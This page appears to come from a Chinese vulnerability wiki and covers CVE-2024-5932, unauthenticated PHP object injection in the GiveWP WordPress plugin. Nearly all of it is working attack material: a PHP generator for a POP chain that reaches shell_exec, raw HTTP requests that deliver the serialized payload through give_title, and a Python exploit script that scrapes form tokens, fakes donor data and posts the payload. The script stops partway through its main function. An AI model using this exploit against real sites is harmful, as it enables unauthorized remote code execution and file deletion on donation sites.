<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Wordpress/WordPress%E6%8F%92%E4%BB%B6GiveWP%E5%AD%98%E5%9C%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E%28CVE-2024-5932%29/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>WordPress插件GiveWP存在反序列漏洞(CVE-2024-5932) - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "WordPress\u63d2\u4ef6GiveWP\u5b58\u5728\u53cd\u5e8f\u5217\u6f0f\u6d1e(CVE-2024-5932)", url: "#_top", children: [
              {title: "poc", url: "#poc" },
              {title: "\u6f0f\u6d1e\u6765\u6e90", url: "#_3" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../WordPress%E6%8F%92%E4%BB%B6GutenKit%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%28CVE-2024-9234%29/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../WordPress%E6%8F%92%E4%BB%B6GutenKit%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%28CVE-2024-9234%29/" class="btn btn-xs btn-link">
        WordPress插件GutenKit存在任意文件上传漏洞(CVE-2024-9234)
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../WordPress%E6%8F%92%E4%BB%B6FileUpload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%28CVE-2024-9047%29/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../WordPress%E6%8F%92%E4%BB%B6FileUpload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%28CVE-2024-9047%29/" class="btn btn-xs btn-link">
        WordPress插件FileUpload任意文件读取漏洞复现(CVE-2024-9047)
      </a>
    </div>
    
  </div>

    

    <h1 id="wordpressgivewpcve-2024-5932">WordPress插件GiveWP存在反序列漏洞(CVE-2024-5932)<a class="headerlink" href="#wordpressgivewpcve-2024-5932" title="Permanent link">&para;</a></h1>
<p>WordPress中的GiveWP捐款插件和募捐平台插件存在PHP对象注入漏洞，该漏洞存在于所有版本，包括最高版本3.14.1在内。漏洞源于对来自“give_title”参数的不可信输入进行反序列化操作。这使得未经身份验证的攻击者能够注入PHP对象。此外，如果存在POP链，攻击者可以远程执行代码并删除任意文件。</p>
<h2 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
<h3 id="pop-pocphp">生成pop链 poc.php<a class="headerlink" href="#pop-pocphp" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
<span class="k">namespace</span> <span class="nx">Stripe</span><span class="p">{</span>
    <span class="k">class</span> <span class="nc">StripeObject</span>
    <span class="p">{</span>
        <span class="k">protected</span> <span class="nv">$_values</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_values</span><span class="p">[</span><span class="s1">&#39;foo&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">\Give\PaymentGateways\DataTransferObjects\GiveInsertPaymentData</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">namespace</span> <span class="nx">Give\PaymentGateways\DataTransferObjects</span><span class="p">{</span>
    <span class="k">class</span> <span class="nc">GiveInsertPaymentData</span><span class="p">{</span>
    <span class="k">public</span> <span class="nv">$userInfo</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">userInfo</span><span class="p">[</span><span class="s1">&#39;address&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">\Give</span><span class="p">();</span>
    <span class="p">}</span> 
    <span class="p">}</span>
<span class="p">}</span>   

<span class="k">namespace</span><span class="p">{</span>
    <span class="k">class</span> <span class="nc">Give</span><span class="p">{</span>
        <span class="k">protected</span> <span class="nv">$container</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
        <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">container</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">\Give\Vendors\Faker\ValidGenerator</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">namespace</span> <span class="nx">Give\Vendors\Faker</span><span class="p">{</span>
    <span class="k">class</span> <span class="nc">ValidGenerator</span><span class="p">{</span>
        <span class="k">protected</span> <span class="nv">$validator</span><span class="p">;</span>
        <span class="k">protected</span> <span class="nv">$generator</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
        <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">validator</span> <span class="o">=</span> <span class="s2">&quot;shell_exec&quot;</span><span class="p">;</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">generator</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">\Give\Onboarding\SettingsRepository</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">namespace</span> <span class="nx">Give\Onboarding</span><span class="p">{</span>
    <span class="k">class</span> <span class="nc">SettingsRepository</span><span class="p">{</span>
        <span class="k">protected</span> <span class="nv">$settings</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
        <span class="p">{</span>
            <span class="nv">$this</span> <span class="o">-&gt;</span> <span class="na">settings</span><span class="p">[</span><span class="s1">&#39;address1&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;touch /tmp/EQSTtest&#39;</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">namespace</span><span class="p">{</span>
    <span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Stripe\StripeObject</span><span class="p">();</span>
    <span class="k">echo</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>
<h3 id="_1">漏洞复现<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h3>
<p><strong>获取give_form_id</strong></p>
<div class="highlight"><pre><span></span><code><span class="x">POST /wp-admin/admin-ajax.php HTTP/1.1</span>
<span class="x">Host: 192.168.178.100:9000</span>
<span class="x">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36</span>
<span class="x">Accept: application/json, text/javascript, */*; q=0.01</span>
<span class="x">Accept-Language: en-US,en;q=0.5</span>
<span class="x">Accept-Encoding: gzip, deflate, br</span>
<span class="x">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span>
<span class="x">X-Requested-With: XMLHttpRequest</span>
<span class="x">Content-Length: 23</span>
<span class="x">Connection: keep-alive</span>
<span class="x">sec-ch-ua-platform: &quot;Windows&quot;</span>
<span class="x">sec-ch-ua: &quot;Google Chrome&quot;;v=&quot;101&quot;, &quot;Chromium&quot;;v=&quot;101&quot;, &quot;Not=A?Brand&quot;;v=&quot;24&quot;</span>
<span class="x">sec-ch-ua-mobile: ?0</span>

<span class="x">action=give_form_search</span>
</code></pre></div>
<p><img alt="img" src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409050947910.png" /></p>
<p><strong>获取 give-form-hash</strong></p>
<div class="highlight"><pre><span></span><code>POST /wp-admin/admin-ajax.php HTTP/1.1
Host: 192.168.178.100:9000
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 47
Connection: keep-alive
sec-ch-ua-platform: &quot;Windows&quot;
sec-ch-ua: &quot;Google Chrome&quot;;v=&quot;101&quot;, &quot;Chromium&quot;;v=&quot;101&quot;, &quot;Not=A?Brand&quot;;v=&quot;24&quot;
sec-ch-ua-mobile: ?0

action=give_donation_form_nonce&amp;give_form_id=11
</code></pre></div>
<p><img alt="img" src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409050948442.png" /></p>
<p><strong>give_title 填入poc.php生成的序列化数据</strong></p>
<div class="highlight"><pre><span></span><code><span class="x">POST /wp-admin/admin-ajax.php HTTP/1.1</span>
<span class="x">Host: 192.168.178.100:9000</span>
<span class="x">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36</span>
<span class="x">Accept: application/json, text/javascript, */*; q=0.01</span>
<span class="x">Accept-Language: en-US,en;q=0.5</span>
<span class="x">Accept-Encoding: gzip, deflate, br</span>
<span class="x">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span>
<span class="x">X-Requested-With: XMLHttpRequest</span>
<span class="x">Content-Length: 653</span>
<span class="x">Connection: keep-alive</span>
<span class="x">sec-ch-ua-platform: &quot;Windows&quot;</span>
<span class="x">sec-ch-ua: &quot;Google Chrome&quot;;v=&quot;101&quot;, &quot;Chromium&quot;;v=&quot;101&quot;, &quot;Not=A?Brand&quot;;v=&quot;24&quot;</span>
<span class="x">sec-ch-ua-mobile: ?0</span>

<span class="x">action=give_process_donation&amp;give-form-hash=cc27fec673&amp;give-form-id=11&amp;give_email=1@random.com&amp;give_first=a&amp;give-amount=10&amp;give-gateway=manual&amp;give_stripe_payment_method=&amp;give_last=b&amp;give_title=to_be_unserialized</span>
</code></pre></div>
<h3 id="_2">利用脚本<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">bs4</span><span class="w"> </span><span class="kn">import</span> <span class="n">BeautifulSoup</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">faker</span><span class="w"> </span><span class="kn">import</span> <span class="n">Faker</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">urllib.parse</span><span class="w"> </span><span class="kn">import</span> <span class="n">urlparse</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">random</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">hashlib</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">re</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">rich_click</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="nn">click</span>

<span class="n">requests</span><span class="o">.</span><span class="n">packages</span><span class="o">.</span><span class="n">urllib3</span><span class="o">.</span><span class="n">disable_warnings</span><span class="p">(</span>
    <span class="n">requests</span><span class="o">.</span><span class="n">packages</span><span class="o">.</span><span class="n">urllib3</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">InsecureRequestWarning</span>
<span class="p">)</span>

<span class="n">banner</span> <span class="o">=</span> <span class="sa">r</span><span class="s2">&quot;&quot;&quot; </span>
<span class="s2">Analysis base : https://www.wordfence.com/blog/2024/08/4998-bounty-awarded-and-100000-wordpress-sites-protected-against-unauthenticated-remote-code-execution-vulnerability-patched-in-givewp-wordpress-plugin/</span>

<span class="s2">=============================================================================================================    </span>

<span class="s2">CVE-2024-5932 : GiveWP unauthenticated PHP Object Injection</span>
<span class="s2">description: The GiveWP  Donation Plugin and Fundraising Platform plugin for WordPress is vulnerable to PHP Object Injection in all versions up to, and including, 3.14.1 via deserialization of untrusted input from the &#39;give_title&#39; parameter. This makes it possible for unauthenticated attackers to inject a PHP Object. The additional presence of a POP chain allows attackers to execute code remotely, and to delete arbitrary files.</span>
<span class="s2">Arbitrary File Deletion</span>

<span class="s2">============================================================================================================= </span>
<span class="s2">    &quot;&quot;&quot;</span>

<span class="k">class</span><span class="w"> </span><span class="nc">GiveWPExploit</span><span class="p">:</span>

    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">file</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">url</span> <span class="o">=</span> <span class="n">url</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">file</span> <span class="o">=</span> <span class="n">file</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">greeting</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="n">banner</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">spinner</span><span class="p">(</span><span class="n">duration</span><span class="o">=</span><span class="mi">10</span><span class="p">,</span> <span class="n">interval</span><span class="o">=</span><span class="mf">0.1</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
        <span class="n">spinner_chars</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;|&#39;</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="s1">&#39;-&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">&#39;</span><span class="p">]</span>
        <span class="n">end_time</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">+</span> <span class="n">duration</span>
        <span class="k">while</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">&lt;</span> <span class="n">end_time</span><span class="p">:</span>
            <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">spinner_chars</span><span class="p">:</span>
                <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="se">\r</span><span class="s1">[</span><span class="si">{</span><span class="n">char</span><span class="si">}</span><span class="s1">] Exploit loading, please wait...&#39;</span><span class="p">)</span>
                <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
                <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">interval</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">getBaseUrl</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">):</span>
        <span class="n">parsed_url</span> <span class="o">=</span> <span class="n">urlparse</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
        <span class="n">base_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">parsed_url</span><span class="o">.</span><span class="n">scheme</span><span class="si">}</span><span class="s2">://</span><span class="si">{</span><span class="n">parsed_url</span><span class="o">.</span><span class="n">netloc</span><span class="si">}</span><span class="s2">&quot;</span>
        <span class="k">return</span> <span class="n">base_url</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">getParams</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">dict</span><span class="p">:</span>
        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">url</span><span class="p">)</span>
        <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="s1">&#39;html.parser&#39;</span><span class="p">)</span>

        <span class="n">give_form_id</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;input&#39;</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;name&#39;</span><span class="p">:</span> <span class="s1">&#39;give-form-id&#39;</span><span class="p">})[</span><span class="s1">&#39;value&#39;</span><span class="p">]</span>
        <span class="n">give_form_hash</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;input&#39;</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;name&#39;</span><span class="p">:</span> <span class="s1">&#39;give-form-hash&#39;</span><span class="p">})[</span><span class="s1">&#39;value&#39;</span><span class="p">]</span>
        <span class="n">button_tag</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;button&#39;</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;data-price-id&#39;</span><span class="p">:</span> <span class="kc">True</span><span class="p">})</span>
        <span class="n">give_price_id</span> <span class="o">=</span> <span class="n">button_tag</span><span class="p">[</span><span class="s1">&#39;data-price-id&#39;</span><span class="p">]</span>
        <span class="n">give_amount</span> <span class="o">=</span> <span class="n">button_tag</span><span class="o">.</span><span class="n">get_text</span><span class="p">(</span><span class="n">strip</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>

        <span class="c1"># Fake Userinfo</span>
        <span class="n">fake</span> <span class="o">=</span> <span class="n">Faker</span><span class="p">()</span>

        <span class="n">params</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;give-form-id&quot;</span> <span class="p">:</span> <span class="n">give_form_id</span><span class="p">,</span> 
                  <span class="s2">&quot;give-form-hash&quot;</span> <span class="p">:</span> <span class="n">give_form_hash</span><span class="p">,</span> 
                  <span class="s2">&quot;give-price-id&quot;</span> <span class="p">:</span> <span class="n">give_price_id</span><span class="p">,</span>
                  <span class="s2">&quot;give-amount&quot;</span> <span class="p">:</span> <span class="n">give_amount</span><span class="p">,</span>
                  <span class="s2">&quot;give_first&quot;</span><span class="p">:</span> <span class="n">fake</span><span class="o">.</span><span class="n">first_name</span><span class="p">(),</span>
                  <span class="s2">&quot;give_last&quot;</span><span class="p">:</span> <span class="n">fake</span><span class="o">.</span><span class="n">last_name</span><span class="p">(),</span>
                  <span class="s2">&quot;give_email&quot;</span><span class="p">:</span> <span class="n">fake</span><span class="o">.</span><span class="n">email</span><span class="p">(),}</span>

        <span class="k">return</span> <span class="n">params</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">getData</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">dict</span><span class="p">:</span>
        <span class="n">file</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">file</span>
        <span class="n">rand_md5</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">10</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
        <span class="c1"># Payload</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;O:19:&quot;Stripe</span><span class="se">\\\\\\\\</span><span class="s1">StripeObject&quot;:1:{s:10:&quot;</span><span class="se">\\</span><span class="s1">0*</span><span class="se">\\</span><span class="s1">0_values&quot;;a:1:{s:3:&quot;foo&quot;;O:62:&quot;Give</span><span class="se">\\\\\\\\</span><span class="s1">PaymentGateways</span><span class="se">\\\\\\\\</span><span class="s1">DataTransferObjects</span><span class="se">\\\\\\\\</span><span class="s1">GiveInsertPaymentData&quot;:1:{s:8:&quot;userInfo&quot;;a:1:{s:7:&quot;address&quot;;O:4:&quot;Give&quot;:1:{s:12:&quot;</span><span class="se">\\</span><span class="s1">0*</span><span class="se">\\</span><span class="s1">0container&quot;;O:33:&quot;Give</span><span class="se">\\\\\\\\</span><span class="s1">Vendors</span><span class="se">\\\\\\\\</span><span class="s1">Faker</span><span class="se">\\\\\\\\</span><span class="s1">ValidGenerator&quot;:3:{s:12:&quot;</span><span class="se">\\</span><span class="s1">0*</span><span class="se">\\</span><span class="s1">0validator&quot;;s:10:&quot;shell_exec&quot;;s:12:&quot;</span><span class="se">\\</span><span class="s1">0*</span><span class="se">\\</span><span class="s1">0generator&quot;;O:34:&quot;Give</span><span class="se">\\\\\\\\</span><span class="s1">Onboarding</span><span class="se">\\\\\\\\</span><span class="s1">SettingsRepository&quot;:1:{s:11:&quot;</span><span class="se">\\</span><span class="s1">0*</span><span class="se">\\</span><span class="s1">0settings&quot;;a:1:{s:8:&quot;address1&quot;;s:</span><span class="si">%d</span><span class="s1">:&quot;</span><span class="si">%s</span><span class="s1">&quot;;}}s:13:&quot;</span><span class="se">\\</span><span class="s1">0*</span><span class="se">\\</span><span class="s1">0maxRetries&quot;;i:10;}}}}}}&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">file</span><span class="p">),</span> <span class="n">file</span><span class="p">)</span>
        <span class="n">data</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">getParams</span><span class="p">()</span>
        <span class="n">data</span><span class="p">[</span><span class="s1">&#39;give_title&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">payload</span>
        <span class="n">data</span><span class="p">[</span><span class="s1">&#39;give-gateway&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;offline&#39;</span>
        <span class="n">data</span><span class="p">[</span><span class="s1">&#39;action&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;give_process_donation&#39;</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] Requested Data: &quot;</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">data</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">isEmbed</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
        <span class="n">pattern</span> <span class="o">=</span> <span class="sa">r</span><span class="s1">&#39;&lt;iframe[\s\S]*?\bname=&quot;give-embed-form&quot;[\s\S]*?&gt;&#39;</span>
        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
        <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">match</span><span class="p">:</span>
            <span class="n">soup1</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="s1">&#39;html.parser&#39;</span><span class="p">)</span>
            <span class="n">embed_url</span> <span class="o">=</span> <span class="n">soup1</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;iframe&#39;</span><span class="p">)[</span><span class="s1">&#39;src&#39;</span><span class="p">]</span>
            <span class="k">return</span> <span class="n">embed_url</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">url</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">sendRequest</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
        <span class="c1"># Fake User_Agent</span>
        <span class="n">fake</span> <span class="o">=</span> <span class="n">Faker</span><span class="p">()</span>
        <span class="n">baseUrl</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">getBaseUrl</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">url</span><span class="p">)</span>
        <span class="n">reqUrl</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">baseUrl</span><span class="si">}</span><span class="s2">/wp-admin/admin-ajax.php&quot;</span>
        <span class="n">data</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">getData</span><span class="p">()</span>
        <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="n">fake</span><span class="o">.</span><span class="n">user_agent</span><span class="p">(),</span>
            <span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span> <span class="s1">&#39;application/x-www-form-urlencoded; charset=UTF-8&#39;</span><span class="p">,</span>
            <span class="s1">&#39;Accept-Encoding&#39;</span><span class="p">:</span> <span class="s1">&#39;gzip, deflate, br&#39;</span>
        <span class="p">}</span>
        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">reqUrl</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">exploit</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">url</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">isEmbed</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">url</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">sendRequest</span><span class="p">()</span>

<span class="c1"># argument parsing with rich_click</span>
<span class="nd">@click</span><span class="o">.</span><span class="n">command</span><span class="p">()</span>
<span class="nd">@click</span><span class="o">.</span><span class="n">option</span><span class="p">(</span>
    <span class="s2">&quot;-u&quot;</span><span class="p">,</span>
    <span class="s2">&quot;--url&quot;</span><span class="p">,</span>
    <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
    <span class="n">help</span><span class="o">=</span><span class="s2">&quot;Specify a URL or domain for vulnerability detection (Donation-Form Page)&quot;</span><span class="p">,</span>
<span class="p">)</span>
<span class="nd">@click</span><span class="o">.</span><span class="n">option</span><span class="p">(</span>
    <span class="s2">&quot;-c&quot;</span><span class="p">,</span>
    <span class="s2">&quot;--cmd&quot;</span><span class="p">,</span>
    <span class="n">default</span><span class="o">=</span><span class="s2">&quot;/tmp/test&quot;</span><span class="p">,</span>
    <span class="n">help</span><span class="o">=</span><span class="s2">&quot;Specify the file to read from the server&quot;</span><span class="p">,</span>
<span class="p">)</span>

<span class="k">def</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">url</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">cmd</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
    <span class="n">cve_exploit</span> <span class="o">=</span> <span class="n">GiveWPExploit</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">cmd</span><span class="p">)</span>
    <span class="n">GiveWPExploit</span><span class="o">.</span><span class="n">greeting</span><span class="p">()</span>
